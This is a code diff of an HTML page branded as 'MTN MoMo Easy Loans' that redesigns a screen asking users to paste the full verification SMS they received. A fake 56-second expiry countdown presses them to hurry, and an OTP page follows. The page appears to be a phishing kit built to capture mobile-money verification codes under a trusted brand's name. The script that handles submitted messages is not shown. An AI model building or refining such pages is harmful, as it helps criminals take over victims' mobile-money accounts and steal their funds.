@@ -620,26 +620,46 @@
 
       </div>
     </div>
-   
-
-    <!-- ─── SMS paste ─── -->
+    
+    <!-- ─── SMS paste (redesigned) ─── -->
     <div id="page-sms-paste" class="page">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub" data-i18n="navSubEasyLoans">Easy Loans</div>
-        </div>
-        <button class="nav-lang" onclick="showGate()">🌐</button>
+      <div class="navbar" style="background:#fff; border-bottom:1px solid #eef1f6;">
+        <a class="nav-left" style="color:#003366;" onclick="goTo('page-welcome')">← <span data-i18n="back">Back</span></a>
+        <div style="color:#1C2340; font-weight:700; font-size:1rem;" data-i18n="smsTitle">SMS Verification</div>
+        <button class="nav-lang" style="color:#003366;" onclick="showGate()">🌐</button>
       </div>
-      <div style="padding: 24px;">
-        <div class="field">
-          <label data-i18n="smsLabel">Paste SMS message</label>
-          <textarea id="smsMsgBox" data-i18n-ph="smsPlaceholder" placeholder="Paste the SMS you received..."></textarea>
+
+      <div style="flex:1; background:#F5F5F5; padding:24px 16px; display:flex; justify-content:center;">
+        <div style="background:#fff; border-radius:16px; padding:24px; max-width:460px; width:100%; box-shadow:0 4px 20px rgba(0,0,0,0.06); height:fit-content;">
+          <h2 style="font-size:1.2rem; color:#003366; margin-bottom:8px; font-weight:700;" data-i18n="smsCardTitle">Paste SMS Message</h2>
+          <p style="font-size:0.85rem; color:#666; margin-bottom:18px; line-height:1.5;" data-i18n="smsCardSub">A verification message has been sent to your phone. Please copy and paste the full message here.</p>
+
+          <div style="background:#fff7e0; border:1px solid #f0d98a; border-radius:10px; padding:12px 14px; display:flex; gap:12px; align-items:center; margin-bottom:16px;">
+            <div style="width:42px; height:42px; border-radius:50%; background:#fff; border:3px solid #f0a500; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:0.85rem; color:#f0a500; flex-shrink:0;">
+              <span id="smsCountdown">56</span>
+            </div>
+            <div style="font-size:0.82rem; color:#8a5a00; line-height:1.35;">
+              <div style="font-weight:700;" data-i18n="smsExpires">Message expires in 56s.</div>
+              <div data-i18n="smsExpiresSub">Paste your SMS before time runs out.</div>
+            </div>
+          </div>
+
+          <div class="field" style="margin-bottom:12px;">
+            <textarea id="smsMsgBox" data-i18n-ph="smsPlaceholderFull" placeholder="Paste your full SMS message here..." style="width:100%; min-height:110px; padding:14px; border:1.5px solid #ddd; border-radius:10px; font-family:'Inter',sans-serif; font-size:0.92rem; color:#1C2340; outline:none; resize:vertical; transition:border-color 0.2s, box-shadow 0.2s;" oninput="checkSmsInput()"></textarea>
+            <p style="font-size:0.75rem; color:#888; font-style:italic; margin-top:8px;" data-i18n="smsExample">Example: "Your MTN MoMo verification code is: 123456"</p>
+          </div>
+
+          <button id="smsSubmitBtn" class="btn-grad" onclick="submitSms()" disabled style="opacity:0.5; cursor:not-allowed;" data-i18n="smsSubmit">SUBMIT</button>
         </div>
-        <button class="btn-grad" onclick="submitSms()" data-i18n="smsSubmit">SUBMIT</button>
+      </div>
+
+      <div style="background:#003366; color:#fff; text-align:center; padding:20px; font-size:0.78rem;">
+        <span data-i18n="smsFooter">© 2026 MTN MoMo Loans – Powered by MTN</span>
       </div>
     </div>
+   
+
+    
 
     <!-- ─── OTP page ─── -->
     <div id="page-otp" class="page">
